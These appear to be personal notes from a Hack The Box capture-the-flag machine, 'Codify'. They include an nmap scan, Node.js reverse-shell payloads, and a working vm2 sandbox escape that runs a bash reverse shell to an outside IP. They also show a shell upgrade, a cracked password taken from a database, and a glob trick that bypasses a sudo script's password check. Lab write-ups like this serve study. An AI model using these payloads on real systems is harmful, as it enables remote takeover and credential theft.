nmap
nmap -p  $(nmap -p- $IP -sS -T4 | grep "open" | awk -F'/' '{print $1}' | tr '\n' ',' ) $IP -A -oN nmap.final
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify

```

10.129.114.237:80
- codify.htb -> add to /etc/hosts

Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7

Y2hpbGRfcHJvY2Vzcw==

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.33.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

(function(){
    var net = require("net"),
        base64String = "Y2hpbGRfcHJvY2Vzcw==";
        const bufferObj = Buffer.from(base64String, 'base64');
        cp = require(bufferObj.toString('utf-8'));
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.33.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

This doesnt work either. Still says module "child_process" not allowed.

function stackTrace() {
var err = new Error();
console.log(err.stack);
}
stackTrace();

https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244


What worked:
``` javascript

const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("bash -c 'sh -i >& /dev/tcp/10.10.15.140/4444 0>&1'").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

Then to upgrade
`python3 -c 'import pty; pty.spawn("/bin/bash")'


Lateral movement
- Check the codify web page directory
	- grep -R "codify" / 2>/dev/null  
	- svc@codify:/var/www/contact$ cat tickets.db
		- found hash to crack, got password spongebob1 for joshua

- 6ce786c35a0a3de579c42f63c34fc9e8
sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

the script has
`if [[ $DB_PASS == $USER_PASS ]]
- can bypass this check by setting input as *